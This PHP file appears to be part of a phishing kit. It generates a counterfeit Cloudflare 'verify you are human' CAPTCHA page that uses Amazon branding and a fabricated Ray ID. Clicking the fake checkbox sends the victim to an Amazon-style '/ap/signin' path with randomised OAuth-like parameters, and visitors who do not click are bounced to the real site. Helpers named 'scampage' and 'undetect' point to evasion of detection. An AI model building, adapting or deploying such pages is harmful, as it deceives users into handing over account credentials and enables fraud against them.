<?php
require __DIR__ . '/../function.php';
require $api->language();

$page = "Cloudflare CAPTCHA";
$api->check_cookie();
$api->session("glitch", true, $page);

$html = '
<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta name="robots" content="noindex,nofollow">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>'.$api->text_encode($lang['cloudflare']['title']).'</title>
    <script>
        document.cookie = "="+window.screen.width;
        document.cookie = "="+window.screen.height;
    </script>
    <style>
    * {
        box-sizing:border-box;
        margin:0;
        padding:0
    }
    html {
        line-height:1.15;
        -webkit-text-size-adjust:100%;
        color:#313131
    }
    html,
    button {
        font-family:system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji
    }
    body {
        display:flex;
        flex-direction:column;
        min-height:100vh
    }
    a {
        transition:color .15s ease;
        background-color:transparent;
        text-decoration:none;
        color:#0051c3
    }
    a:hover {
        text-decoration:underline;
        color:#ee730a
    }
    .hidden {
        display:none
    }
    .privacy-pass {
        overflow:hidden
    }
    .privacy-pass-icon {
        display:inline-block;
        background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAiCAQAAACzFZKcAAAA7UlEQVR42u2W2w2EIBBFKcEObIESLIUS7EA70BIswQ4ogRIo5ewHukoirAhmNxvv50wyJ/PQixCeKKFKhIQsAqjDAAXMIkNMQBtOW0BlARrABoZEB1iRKQwwHCWGD/M7C3B77PahCoWB3PF4mwSLolrn7gKNKCTkVtVdvqaNXO/VPjSAABA36bsA1+BpmXRAoi4BkkbxAB7AnwLu/dBMUn39ez+7ogB0GbP0bLhdDWezTFmsfLOzzMX0bXHTN4vpv8M9QH4X1ACMR6kx5ExJAAv0ocVYyHu8oKKvQ1pgygLM0U0u88uVjF1vAfk1Xx80X1CEa7XTAAAAAElFTkSuQmCC);
        background-size:contain;
        width:24px;
        height:17px
    }
    .privacy-pass-icon-wrapper {
        position:relative;
        top:.2rem;
        margin-left:.2rem
    }
    .privacy-pass a {
        -webkit-appearance:button;
        -moz-appearance:button;
        appearance:button;
        float:right;
        border-radius:0 0 0 .313rem;
        background-color:#313131;
        padding:.5rem 1rem;
        text-align:right;
        text-decoration:none;
        line-height:1.313rem;
        color:#fff;
        font-size:.875rem;
        font-weight:600
    }
    .main-content {
        margin:8rem auto;
        width:100%;
        max-width:60rem
    }
    .heading-favicon {
        margin-right:.5rem;
        width:2rem;
        height:2rem
    }
    @media (max-width: 720px) {
        .main-content {
            margin-top:4rem
        }
        .heading-favicon {
            width:1.5rem;
            height:1.5rem
        }
    }
    .main-content,
    .footer {
        padding-right:1.5rem;
        padding-left:1.5rem
    }
    .main-wrapper {
        display:flex;
        flex:1;
        flex-direction:column;
        align-items:center
    }
    .font-red {
        color:#b20f03
    }
    .spacer {
        margin:2rem 0
    }
    .h1 {
        line-height:3.75rem;
        font-size:2.5rem;
        font-weight:500
    }
    .h2 {
        line-height:2.25rem;
        font-size:1.5rem;
        font-weight:500
    }
    .core-msg {
        line-height:2.25rem;
        font-size:1.5rem;
        font-weight:400
    }
    .body-text {
        line-height:1.25rem;
        font-size:1rem;
        font-weight:400
    }
    .expandable-title {
        line-height:1.5rem;
        font-weight:500
    }
    @media (max-width: 720px) {
        .h1 {
            line-height:1.75rem;
            font-size:1.5rem
        }
        .h2 {
            line-height:1.5rem;
            font-size:1.25rem
        }
        .core-msg {
            line-height:1.5rem;
            font-size:1rem
        }
    }
    .icon-wrapper {
        display:inline-block;
        position:relative;
        top:.25rem;
        margin-right:.2rem
    }
    .heading-icon {
        width:1.625rem;
        height:1.625rem
    }
    @media (max-width: 720px) {
        .heading-icon {
            width:1.25rem;
            height:1.25rem
        }
    }
    .warning-icon {
        display:inline-block;
        background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADQAAAA0CAMAAADypuvZAAAAPFBMVEUAAACvDwOyDwKyDwOvEACyDgOyDwKvDwKwDgCyDgKxDgOyDgKvDgKyDwKyDgOxDgKzDgKxDgKxEASyDwMgW5ZmAAAAE3RSTlMAQN+/EJDvMB9wYJ9Qz7CAf6CAtGoj/AAAAcFJREFUSMeVltu2gyAMRLlfBDxt+f9/PTq2VXSwmod2GdhkEoIiiPmYinK1VqXt4MUFk9bVxlTyvxBdienhNoJwoYMY+57hdMzBTA4v4/gRaykT1FuLNI0/j/1g3i2IJ8s9F+owNCx+2UlWQXbexQFjjTjN1/lGALS9xIm9QIXNOoowlFKrFssYTtmvuOXpp2HtT6lUE3f11bH1IQu9qbYUBEr7yq8zCxkWuva8+rtF4RrkP6ESxFPoj7rtW30+jI4UQlZuiejEwZ4cMg65RKjjUDz6NdwWvxw6nnLESEAl230O5cldUAdy8P44hJZTYh40DOIKzFw3QOI6hPk9aDiFHJc3nMirKERgEPd7FKKgiy5DEn3+5JsrAfHNtfjVRLucTPTaCA1rxFVz6AX8yYsIUlXoMqbPWFUeXF1Cyqz7Ej1PAXNBs1B1tsKWKpsX0yFhslTetL4mL8s4j2fyslTbjbT7Va2V7GCG5ukhftijXdsoQhGmzSI4QhHGhVufz4QJ/v6Hug6dK0EK3YuM8/3Lx5h3Z0STywe55oxRejM5Qo4aAtZ8eTBuWp6dl3IXgfnnLpyzBCFctHomnSopejLhH/3AMfEMndTJAAAAAElFTkSuQmCC);
        background-size:cover
    }
    .text-center {
        text-align:center
    }
    .expandable {
        transition:height,border-left .2s;
        border-left:.125rem solid #e5e5e5;
        padding-left:.5rem
    }
    .expandable.expanded {
        border-left-color:#0051c3
    }
    .expandable-summary-btn {
        border:none;
        background:none;
        cursor:pointer;
        padding:0;
        color:inherit;
        font:inherit
    }
    .expandable-details {
        display:none;
        padding:.5rem 0
    }
    .expanded>.expandable-details {
        display:block
    }
    .caret-icon {
        display:inline-block;
        transition:transform .2s;
        background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAElBMVEUAAAAwMDAxMTEyMjIwMDAxMTF+89HTAAAABXRSTlMAgF9/MMasjJIAAABTSURBVCjPzcq7DcAwDANR5TOAm/Rp0meErBAD3n8VW8DBt4JZUALxYp18vmfWUR2ed9TW7iB7K3muOsGfDRFAABKABCABSAASgAQgAUgAkhKLpwMJmwrD+BDiYwAAAABJRU5ErkJggg==);
        background-size:contain;
        width:1rem;
        height:1rem
    }
    .caret-icon-wrapper {
        position:relative;
        top:.1rem;
        margin-left:.2rem
    }
    .expanded .caret-icon {
        transform:rotate(180deg)
    }
    .fact {
        border:.063rem solid #d9d9d9;
        border-radius:.313rem;
        padding:1rem
    }
    .fact .fact-title {
        font-weight:500
    }
    .big-button {
        transition-duration:.2s;
        transition-property:background-color,border-color,color;
        transition-timing-function:ease;
        border:.063rem solid #0051c3;
        border-radius:.313rem;
        padding:.375rem 1rem;
        line-height:1.313rem;
        font-size:.875rem
    }
    .big-button:hover {
        cursor:pointer
    }
    .webauthn-prompt {
        align-items:center
    }
    .captcha-prompt:not(.hidden),
    .webauthn-prompt:not(.hidden) {
        display:flex
    }
    .webauthn-divider {
        padding:0 1.5rem
    }
    @media (max-width: 720px) {
        .captcha-prompt:not(.hidden),
        .webauthn-prompt:not(.hidden) {
            flex-wrap:wrap;
            justify-content:center
        }
        .webauthn-divider {
            margin:1rem 0;
            width:100%;
            text-align:center
        }
    }
    .webauthn-button {
        background-color:#fff;
        color:#0051c3
    }
    .webauthn-button:hover {
        border-color:#003681;
        background-color:#003681;
        color:#fff
    }
    .pow-button {
        margin:2rem 0;
        background-color:#0051c3;
        color:#fff
    }
    .pow-button:hover {
        border-color:#003681;
        background-color:#003681;
        color:#fff
    }
    .footer {
        margin:0 auto;
        width:100%;
        max-width:60rem;
        line-height:1.125rem;
        font-size:.75rem
    }
    .footer-inner {
        border-top:1px solid #d9d9d9;
        padding-top:1rem;
        padding-bottom:1rem
    }
    .ip-address {
        margin-left:2.25rem
    }
    .clearfix:after {
        display:table;
        clear:both;
        content:""
    }
    .clearfix .column {
        float:left;
        padding-right:1.5rem;
        width:50%
    }
    .diagnostic-wrapper {
        margin-bottom:.5rem
    }
    .footer .ray-id {
        text-align:center
    }
    .footer .ray-id code {
        font-family:monaco,courier,monospace
    }
    .core-msg,
    .zone-name-title {
        overflow-wrap:break-word
    }
    @media (max-width: 720px) {
        .diagnostic-wrapper {
            display:flex;
            flex-wrap:wrap;
            justify-content:center
        }
        .clearfix:after {
            display:initial;
            clear:none;
            text-align:center;
            content:none
        }
        .column {
            padding-bottom:2rem
        }
        .clearfix .column {
            float:none;
            padding:0;
            width:auto;
            word-break:keep-all
        }
        .zone-name-title {
            margin-bottom:1rem
        }
    }
    .loading-spinner {
        height:76.391px
    }
    .lds-ring {
        display:inline-block;
        position:relative;
        width:1.875rem;
        height:1.875rem
    }
    .lds-ring div {
        box-sizing:border-box;
        display:block;
        position:absolute;
        border:.3rem solid #595959;
        border-radius:50%;
        border-color:#595959 transparent transparent transparent;
        width:1.875rem;
        height:1.875rem;
        animation:lds-ring 1.2s cubic-bezier(.5,0,.5,1) infinite
    }
    .lds-ring div:nth-child(1) {
        animation-delay:-.45s
    }
    .lds-ring div:nth-child(2) {
        animation-delay:-.3s
    }
    .lds-ring div:nth-child(3) {
        animation-delay:-.15s
    }
    @keyframes lds-ring {
        0% {
            transform:rotate(0)
        }
        to {
            transform:rotate(360deg)
        }
    }
    @media screen and (-ms-high-contrast: active),screen and (-ms-high-contrast: none) {
        body,
        .main-wrapper {
            display:block
        }
    }
    body.no-js .loading-spinner {
        visibility:hidden
    }
    body.no-js .cf-challenge-running {
        display:none
    }
    @media (prefers-color-scheme: dark) {
        body {
            background-color:#222;
            color:#d9d9d9
        }
        a {
            color:#fff
        }
        a:hover {
            text-decoration:underline;
            color:#ee730a
        }
        .lds-ring div {
            border-color:#999999 transparent transparent transparent
        }
        .privacy-pass a {
            background-color:#d9d9d9
        }
        .font-red {
            color:#fc574a
        }
        .big-button,
        .webauthn-button,
        .pow-button {
            background-color:#4693ff;
            color:#1d1d1d
        }
        .expandable.expanded {
            border-left-color:#4693ff
        }
    }
    </style>
</head>
<body class="no-js">
    <div class="main-wrapper" role="main">
        <div class="main-content">
            <h1 class="zone-name-title h1">
                <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 32 32" fill-rule="evenodd">
                    <path d="M28.312 28.26C25.003 30.7 20.208 32 16.08 32c-5.8 0-11.002-2.14-14.945-5.703-.3-.28-.032-.662.34-.444C5.73 28.33 11 29.82 16.426 29.82a29.73 29.73 0 0 0 11.406-2.332c.56-.238 1.03.367.48.773m1.376-1.575c-.42-.54-2.796-.255-3.86-.13-.325.04-.374-.243-.082-.446 1.9-1.33 4.994-.947 5.356-.5s-.094 3.56-1.87 5.044c-.273.228-.533.107-.4-.196.4-.996 1.294-3.23.87-3.772" fill="#f90"/>
                    <path d="M18.43 13.864c0 1.692.043 3.103-.812 4.605-.7 1.22-1.8 1.973-3.005 1.973-1.667 0-2.644-1.27-2.644-3.145 0-3.7 3.316-4.373 6.462-4.373v.94m4.38 10.584c-.287.257-.702.275-1.026.104-1.44-1.197-1.704-1.753-2.492-2.895-2.382 2.43-4.074 3.157-7.158 3.157-3.658 0-6.498-2.254-6.498-6.767 0-3.524 1.905-5.924 4.63-7.097 2.357-1.038 5.65-1.22 8.165-1.5V8.9c0-1.032.08-2.254-.53-3.145-.525-.8-1.54-1.13-2.437-1.13-1.655 0-3.127.85-3.487 2.608-.073.4-.36.776-.757.794L7 7.555c-.354-.08-.75-.366-.647-.9C7.328 1.54 11.945 0 16.074 0c2.113 0 4.874.562 6.54 2.162 2.113 1.973 1.912 4.605 1.912 7.47V16.4c0 2.034.843 2.925 1.637 4.025.275.4.336.86-.018 1.154a184.26 184.26 0 0 0-3.328 2.883l-.006-.012" fill="#221f1f"/>
                    <path d="M-29.65 355.868c-35 25.797-85.73 39.56-129.406 39.56-61.243 0-116.377-22.65-158.088-60.325-3.277-2.963-.34-7 3.592-4.693 45.014 26.2 100.673 41.947 158.166 41.947 38.775 0 81.43-8.022 120.65-24.67 5.925-2.517 10.88 3.88 5.086 8.18m14.55-16.647c-4.457-5.715-29.573-2.7-40.846-1.363-3.434.42-3.96-2.57-.865-4.72 20.003-14.078 52.827-10.015 56.655-5.296 3.828 4.745-.996 37.647-19.794 53.35-2.884 2.412-5.637 1.127-4.352-2.07 4.22-10.54 13.685-34.16 9.202-39.902" fill="#f90"/>
                    <path d="M-55.16 233.75v-13.685c0-2.07 1.573-3.46 3.46-3.46H9.57c1.966 0 3.54 1.416 3.54 3.46v11.72c-.026 1.966-1.678 4.536-4.614 8.6l-31.75 45.33c11.798-.288 24.25 1.468 34.947 7.498 2.412 1.363 3.067 3.356 3.25 5.322v14.603c0 1.992-2.202 4.326-4.5 3.12-18.85-9.884-43.887-10.96-64.73.105-2.124 1.154-4.352-1.154-4.352-3.146v-13.87c0-2.228.026-6.03 2.255-9.412l36.782-52.748h-32c-1.966 0-3.54-1.4-3.54-3.434m-223.495 85.385h-18.64c-1.783-.13-3.198-1.468-3.33-3.172V220.3c0-1.914 1.6-3.434 3.592-3.434h17.382c1.8.08 3.25 1.468 3.382 3.198v12.505h.34c4.536-12.086 13.056-17.723 24.54-17.723 11.666 0 18.955 5.637 24.198 17.723 4.5-12.086 14.76-17.723 25.745-17.723 7.813 0 16.36 3.225 21.576 10.46 5.9 8.05 4.693 19.74 4.693 29.992l-.026 60.377c0 1.914-1.6 3.46-3.592 3.46h-18.614c-1.86-.13-3.356-1.625-3.356-3.46v-50.703c0-4.037.367-14.105-.524-17.932-1.4-6.423-5.558-8.232-10.96-8.232-4.5 0-9.228 3.015-11.142 7.84s-1.73 12.9-1.73 18.326v50.703c0 1.914-1.6 3.46-3.592 3.46h-18.614c-1.888-.13-3.356-1.625-3.356-3.46l-.026-50.703c0-10.67 1.757-26.374-11.483-26.374-13.397 0-12.872 15.3-12.872 26.374v50.703c0 1.914-1.6 3.46-3.592 3.46m344.496-104.3c27.66 0 42.63 23.752 42.63 53.954 0 29.18-16.543 52.33-42.63 52.33-27.16 0-41.947-23.752-41.947-53.35 0-29.782 14.97-52.932 41.947-52.932m.157 19.532c-13.738 0-14.603 18.72-14.603 30.385 0 11.693-.184 36.65 14.445 36.65 14.445 0 15.127-20.135 15.127-32.404 0-8.075-.34-17.723-2.78-25.378-2.097-6.66-6.266-9.255-12.2-9.255m78.338 84.758H125.8c-1.86-.13-3.356-1.625-3.356-3.46l-.026-95.7c.157-1.757 1.704-3.12 3.592-3.12h17.277c1.625.08 2.962 1.18 3.33 2.674v14.63h.34c5.217-13.082 12.532-19.322 25.404-19.322 8.363 0 16.517 3.015 21.76 11.273 4.876 7.655 4.876 20.528 4.876 29.782v60.22c-.2 1.678-1.757 3.015-3.592 3.015h-18.693c-1.704-.13-3.12-1.4-3.303-3.015v-51.962c0-10.46 1.206-25.77-11.667-25.77-4.535 0-8.704 3.04-10.775 7.655-2.622 5.846-2.962 11.667-2.962 18.116v51.516c-.026 1.914-1.652 3.46-3.644 3.46m66.293-7.594c0-4.824 4.116-8.704 9.176-8.704s9.176 3.88 9.176 8.704c0 4.798-4.116 8.73-9.176 8.73s-9.176-3.933-9.176-8.73m197.5 7.63c-1.94-.08-3.46-1.573-3.46-3.46V220.04c.105-1.704 1.547-3.04 3.33-3.146h6.843c1.888 0 3.408 1.363 3.565 3.146v13.947c4.876-11.064 13.947-19.715 25.404-19.715h1.4c12.165 0 21.052 8.966 24.355 21.996 5.165-12.872 14.865-21.996 27.66-21.996h1.416c9.045 0 17.75 5.82 22.258 14.68 4.352 8.468 4.195 19.74 4.195 29.206l-.026 57.546c.026 1.835-1.468 3.33-3.33 3.46h-8.18c-1.783-.08-3.225-1.337-3.46-3v-58.018c0-6.843.34-14.105-2.438-20.344-2.83-6.37-8.258-10.356-14.078-10.644-6.502.315-12.48 5.06-16.36 11.457-5.034 8.258-4.85 15.704-4.85 25.352v52.25c-.236 1.573-1.625 2.805-3.33 2.936h-8.127c-1.94-.08-3.487-1.573-3.487-3.46l-.052-61.374c0-5.637-.34-12.27-2.936-17.33-3.015-5.768-8.416-9.543-14.078-9.83-5.873.34-11.798 4.824-15.3 10.04-4.536 6.66-5.4 14.9-5.4 23.36v55.134c0 1.835-1.494 3.33-3.356 3.46h-8.153M352 321.157c-26.453 0-38.303-26.977-38.303-53.954 0-28.367 13.92-52.932 40.557-52.932h1.416c25.902 0 38.8 26.164 38.8 53.142 0 28.576-14.288 53.745-41.082 53.745h-1.4m1.94-13.082c8.704-.288 15.573-5.7 19.636-14.68 3.644-8.075 4.352-17.33 4.352-26.2 0-9.648-1.05-19.715-5.584-27.973-4.064-7.2-11.037-11.798-18.43-12.06-8.232.288-15.6 5.873-19.296 14.472-3.33 7.446-4.352 17.33-4.352 25.56 0 9.255 1.206 19.95 5.034 28 3.723 7.63 10.88 12.584 18.64 12.872m-84.6-.422c11.876-.367 18.116-9.884 20.685-22.206.524-1.547 1.704-2.727 3.434-2.727l7.84-.026c1.86.08 3.565 1.494 3.408 3.225-3.618 21-16.28 35.235-34.318 35.235h-1.416c-26.27 0-37.595-26.374-37.595-53.142 0-26.558 11.483-53.745 37.752-53.745h1.416c18.247 0 31.25 14.052 34.082 35.052 0 1.573-1.468 2.936-3.198 3.12l-8.206-.105c-1.73-.236-2.858-1.704-3.12-3.356-1.966-11.72-8.704-21.052-19.925-21.42-17.854.577-22.94 22.546-22.94 39.456 0 16.28 4.247 40.06 22.1 40.636M-104 273.442c0 7.262.184 13.318-3.487 19.767-2.963 5.243-7.682 8.468-12.9 8.468-7.157 0-11.352-5.453-11.352-13.502 0-15.887 14.236-18.77 27.737-18.77v4.037m18.797 45.434c-1.232 1.1-3.015 1.18-4.404.446-6.187-5.14-7.315-7.524-10.696-12.427-10.225 10.434-17.487 13.554-30.726 13.554-15.704 0-27.895-9.674-27.895-29.048 0-15.127 8.18-25.43 19.872-30.464 10.12-4.457 24.25-5.243 35.052-6.476v-2.412c0-4.43.34-9.674-2.28-13.502-2.255-3.434-6.607-4.85-10.46-4.85-7.105 0-13.423 3.644-14.97 11.195-.315 1.678-1.547 3.33-3.25 3.408l-18.063-1.94c-1.52-.34-3.225-1.573-2.78-3.906 4.142-21.917 23.962-28.524 41.685-28.524 9.07 0 20.92 2.412 28.078 9.28 9.07 8.468 8.206 19.767 8.206 32.063v29.048c0 8.73 3.618 12.558 7.026 17.277 1.18 1.678 1.442 3.697-.08 4.955-3.8 3.172-10.565 9.07-14.288 12.374l-.026-.053m-263.164-45.432c0 7.262.183 13.318-3.487 19.767-2.963 5.243-7.655 8.468-12.9 8.468-7.157 0-11.326-5.453-11.326-13.502 0-15.887 14.236-18.77 27.7-18.77v4.037m18.797 45.434c-1.232 1.1-3.015 1.18-4.404.446-6.187-5.14-7.288-7.524-10.696-12.427-10.225 10.434-17.46 13.554-30.726 13.554-15.678 0-27.895-9.674-27.895-29.048 0-15.127 8.206-25.43 19.872-30.464 10.12-4.457 24.25-5.243 35.052-6.476v-2.412c0-4.43.34-9.674-2.255-13.502-2.28-3.434-6.633-4.85-10.46-4.85-7.105 0-13.45 3.644-14.996 11.195-.315 1.678-1.547 3.33-3.225 3.408l-18.1-1.94c-1.52-.34-3.198-1.573-2.78-3.906 4.168-21.917 23.962-28.524 41.685-28.524 9.07 0 20.92 2.412 28.078 9.28 9.07 8.468 8.206 19.767 8.206 32.063v29.048c0 8.73 3.618 12.558 7.026 17.277 1.206 1.678 1.468 3.697-.052 4.955-3.8 3.172-10.565 9.07-14.288 12.374l-.052-.053" fill="#221f1f"/>
                </svg> '.$api->text_encode(''.preg_replace("/^www\./", "", parse_url($api->scampage, PHP_URL_HOST)).'').'
            </h1>
            <h2 class="h2" id="cf-challenge-running">
                '.$api->text_encode($lang['cloudflare']['titlepage']).'
            </h2>
            <div id="challenge-spinner" class="spacer loading-spinner" style="display: block; visibility: visible;">
                <div id="fake-captcha" style="display: none; margin-top: 40px;">
                    <div id="captcha" style="width: 360px; padding: 16px; background: #fff; border: 1px solid #dcdcdc; border-radius: 5px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 1px 2px rgba(238, 237, 237, 0.1); cursor: pointer; margin: right;">
                        <div style="display: flex; align-items: center; gap: 12px;">
                            <div id="box" style="width: 20px; height: 20px; border: 1.5px solid #888; border-radius: 3px; box-sizing: border-box;"></div>
                            <div id="text" style="font-size: 14px; color: #222;">'.$api->text_encode($lang['cloudflare']['verifyhuman']).'</div>
                        </div>
                        <div style="text-align: right;">
                            <img src="'.$api->image_encode("assets/img/logo-cloudflare.svg")['local'].'" alt="'.$api->text_encode($lang['cloudflare']['name']).'" style="height: 20px; margin-bottom: 2px;">
                            <div style="font-size: 10px; color: #888;">'.$api->text_encode($lang['cloudflare']['privacy']).'</div>
                        </div>
                    </div>
                </div>
                <div class="lds-ring">
                    <div></div>
                    <div></div>
                    <div></div>
                    <div></div>
                </div>
            </div>
            <script>
            setTimeout(() => {
                var spinner = document.querySelector(".lds-ring");
                if (spinner) { spinner.style.display = "none"; }
                document.getElementById("fake-captcha").style.display = "block";
                var runningText = document.getElementById("cf-challenge-running");
                if (runningText) {
                    runningText.textContent = ' . json_encode(html_entity_decode($api->text_encode($lang["cloudflare"]["verify_action"]))) . ';
                }
                
                timeoutRedirect = setTimeout(() => {
                    if (!clicked) {
                        window.location.href = "https://'.preg_replace("/^www\./", "", parse_url($api->scampage, PHP_URL_HOST)).'";
                    }
                }, 10000);
            }, 3000);
    
            const captcha = document.getElementById("captcha");
            const box = document.getElementById("box");
            const text = document.getElementById("text");
            let clicked = false;
            let timeoutRedirect;
            
            captcha.addEventListener("click", () => {
                if (clicked) return;
                clicked = true;
                clearTimeout(timeoutRedirect);
                
                box.innerHTML = "<div style=\"width: 18px; height: 18px; border: 2px solid #ccc; border-top: 2px solid #21a541; border-radius: 50%; animation: spin 1s linear infinite;\"></div>";
                box.style.border = "none";
                text.textContent = ' . json_encode(html_entity_decode($api->text_encode($lang['cloudflare']['verifying']))) . ';
                var style = document.createElement("style");
                style.textContent = "@keyframes spin {0% { transform: rotate(0deg); }100% { transform: rotate(360deg); }}";
                document.head.appendChild(style);
                
                setTimeout(() => {
                    box.innerHTML = "✓";
                    box.style.background = "#21a541";
                    box.style.color = "white";
                    box.style.border = "none";
                    box.style.borderRadius = "50%";
                    box.style.fontSize = "14px";
                    box.style.fontWeight = "bold";
                    box.style.display = "flex";
                    box.style.alignItems = "center";
                    box.style.justifyContent = "center";
                    text.textContent = ' . json_encode(html_entity_decode($api->text_encode($lang['cloudflare']['success']))) . ';
                    setTimeout(() => {
                        const isMobile = /Android|iPhone/i.test(navigator.userAgent);
                        const redirectBase = isMobile ? "/ap/mobile/signin" : "/ap/signin";
                        const query = "?openid.pape.max_auth_age=0"
                            + "&client_id=' . substr($api->RANDOM(), 0, 10) . '-' . substr($api->RANDOM(), 0, 8) . '-' . substr($api->RANDOM(), 0, 12) . '"
                            + "&oauth_challenge=' . substr($api->RANDOM(), 0, 8) . '-' . substr($api->RANDOM(), 0, 6). '";
                        window.location.href = redirectBase + query;
                    }, 2000);
                }, 2000);
            });
            </script>
            <style>
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            </style>
            <noscript>
                <div id="cf-challenge-error-title">
                    <div class="h2">
                        <span class="icon-wrapper">
                            <div class="heading-icon warning-icon"></div>
                        </span>
                        <span id="cf-challenge-error-text">
                            '.$api->text_encode($lang['cloudflare']['enable']).'
                        </span>
                    </div>
                </div>
            </noscript>
            <div id="cf-challenge-body-text" class="core-msg spacer">
                '.$api->text_encode(''.preg_replace("/^www\./", "", parse_url($api->scampage, PHP_URL_HOST)).' '.$lang['cloudflare']['verify_message']).'
            </div>
            <div id="challenge-fact-wrapper" style="display: block; visibility: visible;" class="fact spacer hidden">
                <span class="fact-title">'.$api->text_encode($lang['cloudflare']['know']).'</span> 
                <span id="challenge-fact" class="body-text">'.$api->text_encode($lang['cloudflare']['bottraffic']).'</span>
            </div>
        </div>
    </div>
    <div class="footer" role="contentinfo">
        <div class="footer-inner">
            <div class="clearfix diagnostic-wrapper">
                <div class="ray-id">'.$api->text_encode($lang['cloudflare']['rayid']).' <code>'.$api->RANDOM().'</code></div>
            </div>
            <div class="text-center">
                '.$api->text_encode('Performance & Security').'
                <a rel="noopener noreferrer" href="https://www.cloudflare.com/?utm_source=challenge&amp;utm_campaign=j" target="_blank">'.$api->text_encode($lang['cloudflare']['name']).'</a>
            </div>
        </div>
    </div>
<span id="trk_jschal_js"></span>
</body>
</html>';

$api->undetect($html);
?>